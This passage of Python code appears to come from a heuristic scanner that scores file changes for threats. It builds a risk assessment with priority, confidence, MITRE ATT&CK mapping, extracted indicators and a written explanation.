            context_notes.append('Path context indicates test/docs/examples; weak indicators were down-weighted.')

    # -- Build Result --
    is_malicious = max_score >= 8
    priority = _score_to_priority(max_score)

    # Determine dominant threat type from highest-severity findings
    top = sorted(findings, key=lambda f: (f['severity'], f['match_count']), reverse=True)
    dominant_category = top[0]['category'] if top else 'benign'

    # Count corroborating indicators for confidence
    indicator_count = sum(f['match_count'] for f in findings if f['severity'] >= 7)
    high_categories = set(f['category'] for f in findings if f['severity'] >= 7)
    if indicator_count >= 3 and len(high_categories) >= 2:
        confidence = 'high'
    elif indicator_count >= 2:
        confidence = 'medium'
    else:
        confidence = 'low' if max_score < 7 else 'medium'

    # Get MITRE mapping for dominant threat
    mitre_info = MITRE_MAPPING.get(dominant_category, {})
    mitre_techniques = mitre_info.get('techniques', [])
    mitre_tactic = mitre_info.get('tactic', '')

    # Get threat classification
    threat_classification = THREAT_CLASSIFICATIONS.get(dominant_category, '')

    # Extract IOCs from content
    iocs = _extract_iocs(active_content) if active_content else []

    # Build synthesized reasoning
    content_summary = _summarize_content(active_content, file_path) if active_content else ''

    if len(findings) == 1 and findings[0]['severity'] < 5:
        f0 = findings[0]
        reasoning = (
            f"This file change appears to be benign. "
            f"{f0['description']} "
            f"No malicious patterns, known threat signatures, or suspicious code constructs were detected during analysis."
        )
        if content_summary:
            reasoning += f" {content_summary}"
        if context_notes:
            reasoning += f" Context checks applied: {' '.join(context_notes)}"
    else:
        top_items = top[:5]

        if is_malicious:
            parts = []
            parts.append(
                f"THREAT DETECTED - {threat_classification or dominant_category.replace('_', ' ').title()}."
            )
            parts.append(
                f"The heuristic engine matched {len(findings)} threat indicator(s) in this file, "
                f"with the highest severity at {max_score}/10."
            )

            for f in top_items[:3]:
                parts.append(
                    f"- {f['description']} (severity {f['severity']}/10, "
                    f"category: {f['category'].replace('_', ' ')}, "
                    f"{f['match_count']} match{'es' if f['match_count'] > 1 else ''})."
                )

            if content_summary:
                parts.append(content_summary)
            if iocs:
                parts.append(f"Extracted IOCs: {', '.join(iocs)}.")
            if mitre_techniques:
                tactic_str = f" ({mitre_tactic})" if mitre_tactic else ''
                parts.append(f"Mapped to MITRE ATT&CK: {', '.join(mitre_techniques)}{tactic_str}.")
            if context_notes:
                parts.append(f"Context checks: {' '.join(context_notes)}")

            parts.append(
                f"This file should be treated as {priority.upper()} priority and investigated immediately."
            )
            reasoning = ' '.join(parts)
        else:
            parts = []
            parts.append(
                f"Analysis detected {len(findings)} indicator(s) of interest in this file."
            )
            for f in top_items[:3]:
                parts.append(
                    f"- {f['description']} (severity {f['severity']}/10)."
                )
            if len(findings) > 3:
                parts.append(f"Plus {len(findings) - 3} additional lower-severity indicators.")
            if content_summary:
                parts.append(content_summary)
            if context_notes:
                parts.append(f"Context checks: {' '.join(context_notes)}")
            parts.append(
                f"Overall risk is assessed as {priority.upper()} "
                f"(score {max_score}/10). "
                f"No definitive malicious behavior was confirmed, "
                f"but review is recommended if this change was unexpected."
            )
            reasoning = ' '.join(parts)

    output_findings = []
    for f in top:
        entry = {
            'category': f['category'],
            'severity': f['severity'],
            'description': f['description'],
            'matches': f['match_count'],
        }
        if 'raw_severity' in f and f['raw_severity'] != f['severity']:
            entry['raw_severity'] = f['raw_severity']
        if f.get('reference_hits'):
            entry['reference_hits'] = f['reference_hits']
        output_findings.append(entry)

    change_summary = _summarize_change_from_context(content)

    return {
        'risk_score': max_score,
        'priority': priority,
        'is_malicious': is_malicious,
        'threat_type': dominant_category,
        'threat_classification': threat_classification,
        'mitre_attack': mitre_techniques,
        'mitre_tactic': mitre_tactic,
        'iocs': iocs,
        'confidence': confidence,
        'reasoning': reasoning,
        'analysis_source': 'heuristic',
        'context_notes': context_notes,
        'findings': output_findings,
        'change_summary': change_summary,
        'recommended_actions': _default_recommended_actions(max_score, dominant_category),
    }
